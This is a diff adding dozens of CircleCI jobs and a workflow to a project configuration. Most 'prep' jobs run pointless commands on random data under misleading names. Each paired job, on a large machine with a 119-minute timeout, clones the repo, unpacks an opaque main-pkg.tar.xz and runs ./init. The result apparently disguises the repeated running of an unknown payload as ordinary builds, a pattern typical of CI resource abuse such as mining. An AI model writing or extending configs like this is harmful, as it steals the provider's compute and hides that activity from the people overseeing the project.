+            { set +o pipefail 2>/dev/null; head -c 25165824 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/_bld/artifact.tar
+            size=$(wc -c </tmp/_bld/artifact.tar); echo "stage ok: tweak-dashboard-glitch size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact.tar
+  tweak-dashboard-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/artifact.tar 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  auditor_jun26-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 2 32386 | factor | wc -l; true ; } > /tmp/_bld/2024-01-24.data
+            size=$(wc -c </tmp/_bld/2024-01-24.data); echo "stage ok: jun26-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-01-24.data
+  jun26-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  gamma_v7-beta5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 208603 | md5sum; true ; } > /tmp/_bld/step-7.txt
+            size=$(wc -c </tmp/_bld/step-7.txt); echo "stage ok: v7-beta5 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-7.txt
+  v7-beta5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/step-7.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  kick_tb-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 303914 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/_bld/stash.dat
+            size=$(wc -c </tmp/_bld/stash.dat); echo "stage ok: tb-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.dat
+  tb-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/stash.dat 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  B_assemble-end-to-end-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 19600; echo "ftr" ) | wc -l; true ; } > /tmp/_bld/539.data
+            size=$(wc -c </tmp/_bld/539.data); echo "stage ok: assemble-end-to-end-regression-suite size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 539.data
+  assemble-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/539.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+
+  runner_add-router-v2-reload_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 702292 | awk 'NR%11==0{sum+=$1}END{print sum}'; true ; } > /tmp/_bld/ckpt-A.pickle
+            size=$(wc -c </tmp/_bld/ckpt-A.pickle); echo "stage ok: add-router-v2-reload size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-A.pickle
+  kick_v7-beta5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 181530 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/_bld/step-7.txt
+            size=$(wc -c </tmp/_bld/step-7.txt); echo "stage ok: v7-beta5 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-7.txt
+  retry_tweak-dashboard-glitch_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 114837 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/artifact.tar
+            size=$(wc -c </tmp/_bld/artifact.tar); echo "stage ok: tweak-dashboard-glitch size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact.tar
+  step2_API-985_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 228380 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/_bld/trace.gz
+            size=$(wc -c </tmp/_bld/trace.gz); echo "stage ok: API-985 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.gz
+  reset_build-nightly-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 171568 | md5sum; true ; } > /tmp/_bld/331v2.txt
+            size=$(wc -c </tmp/_bld/331v2.txt); echo "stage ok: build-nightly-regression-suite size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 331v2.txt
+  fixture_io-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 921600 | wc -c; true ; } > /tmp/_bld/2024-03-04.data
+            size=$(wc -c </tmp/_bld/2024-03-04.data); echo "stage ok: io-ng size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-03-04.data
+  fixture_pat-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 25165824 | fold -w16 | sort -u | wc -l; true ; } > /tmp/_bld/2023-06-04.data
+            size=$(wc -c </tmp/_bld/2023-06-04.data); echo "stage ok: pat-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-06-04.data
+  verify_teh-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 21504 | wc -c; true ; } > /tmp/_bld/audit.ndjson
+            size=$(wc -c </tmp/_bld/audit.ndjson); echo "stage ok: teh-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.ndjson
+  p2_greg-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 368640 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/_bld/package
+            size=$(wc -c </tmp/_bld/package); echo "stage ok: greg-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  kick_cd-x_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 24576 | wc -c; true ; } > /tmp/_bld/package.pkg
+            size=$(wc -c </tmp/_bld/package.pkg); echo "stage ok: cd-x size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package.pkg
+  vendor_DATA-567_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2034200;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/_bld/ckpt-E.pt
+            size=$(wc -c </tmp/_bld/ckpt-E.pt); echo "stage ok: DATA-567 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-E.pt
+workflows:
+  build-and-test:
+    jobs:
+      - wire_WEB-653
+      - WEB-653:
+          requires:
+            - wire_WEB-653
+      - reset_build-full-docker-image:
+          requires:
+            - wire_WEB-653
+      - build-full-docker-image:
+          requires:
+            - reset_build-full-docker-image
+      - vendor_uniform:
+          requires:
+            - reset_build-full-docker-image
+      - uniform:
+          requires:
+            - vendor_uniform
+      - kick_tb-v2:
+          requires:
+            - vendor_uniform
+      - tb-v2:
+          requires:
+            - kick_tb-v2
+      - B_assemble-end-to-end-regression-suite:
+          requires:
+            - kick_tb-v2
+      - assemble-end-to-end-regression-suite:
+          requires:
+            - B_assemble-end-to-end-regression-suite
+      - warmup_feat-2132:
+          requires:
+            - B_assemble-end-to-end-regression-suite
+      - feat-2132:
+          requires:
+            - warmup_feat-2132
+      - db_lima:
+          requires:
+            - warmup_feat-2132
+      - lima:
+          requires:
+            - db_lima
+      - cook_add-router-v2-reload
+      - runner_add-router-v2-reload_2:
+          requires:
+            - cook_add-router-v2-reload
+      - add-router-v2-reload:
+          requires:
+            - runner_add-router-v2-reload_2
+      - gamma_v7-beta5:
+          requires:
+            - runner_add-router-v2-reload_2
+      - kick_v7-beta5_2:
+          requires:
+            - gamma_v7-beta5
+      - v7-beta5:
+          requires:
+            - kick_v7-beta5_2
+      - install_tweak-dashboard-glitch:
+          requires:
+            - kick_v7-beta5_2
+      - retry_tweak-dashboard-glitch_2:
+          requires:
+            - install_tweak-dashboard-glitch
+      - tweak-dashboard-glitch:
+          requires:
+            - retry_tweak-dashboard-glitch_2
+      - tmp_API-985:
+          requires:
+            - retry_tweak-dashboard-glitch_2
+      - step2_API-985_2:
+          requires:
+            - tmp_API-985
+      - API-985:
+          requires:
+            - step2_API-985_2
+      - g2_build-nightly-regression-suite:
+          requires:
+            - step2_API-985_2
+      - reset_build-nightly-regression-suite_2:
+          requires:
+            - g2_build-nightly-regression-suite
+      - build-nightly-regression-suite:
+          requires:
+            - reset_build-nightly-regression-suite_2
+      - cook_io-ng:
+          requires:
+            - reset_build-nightly-regression-suite_2
+      - fixture_io-ng_2:
+          requires:
+            - cook_io-ng
+      - io-ng:
+          requires:
+            - fixture_io-ng_2
+      - D_pat-smoke
+      - fixture_pat-smoke_2:
+          requires:
+            - D_pat-smoke
+      - pat-smoke:
+          requires:
+            - fixture_pat-smoke_2
+      - maker_teh-ci:
+          requires:
+            - fixture_pat-smoke_2
+      - verify_teh-ci_2:
+          requires:
+            - maker_teh-ci
+      - teh-ci:
+          requires:
+            - verify_teh-ci_2
+      - teardown_greg-smoke:
+          requires:
+            - verify_teh-ci_2
+      - p2_greg-smoke_2:
+          requires:
+            - teardown_greg-smoke
+      - greg-smoke:
+          requires:
+            - p2_greg-smoke_2
+      - drain_cd-x:
+          requires:
+            - p2_greg-smoke_2
+      - kick_cd-x_2:
+          requires:
+            - drain_cd-x
+      - cd-x:
+          requires:
+            - kick_cd-x_2
+      - retry_DATA-567:
+          requires:
+            - kick_cd-x_2
+      - vendor_DATA-567_2:
+          requires:
+            - retry_DATA-567
+      - DATA-567:
+          requires:
+            - vendor_DATA-567_2
+      - fetcher_release
+      - release:
+          requires:
+            - fetcher_release
+      - bundle_canary:
+          requires:
+            - fetcher_release
+      - canary:
+          requires:
+            - bundle_canary
+      - provision_py310-bench:
+          requires:
+            - bundle_canary
+      - py310-bench:
+          requires:
+            - provision_py310-bench
+      - hook_rust-vet:
+          requires:
+            - provision_py310-bench
+      - rust-vet:
+          requires:
+            - hook_rust-vet
+      - g2_romeo-4:
+          requires:
+            - hook_rust-vet
+      - romeo-4:
+          requires:
+            - g2_romeo-4
+      - warmup_phoenix
+      - produce_DEPLOY_STG
+      - g2_apr15-ship
+      - phoenix:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - DEPLOY_STG:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - apr15-ship:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - jun26-release:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - shippit-25:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - verify-staging-docker-image:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
+      - atlas-rev:
+          requires:
+            - warmup_phoenix
+            - produce_DEPLOY_STG
+            - g2_apr15-ship
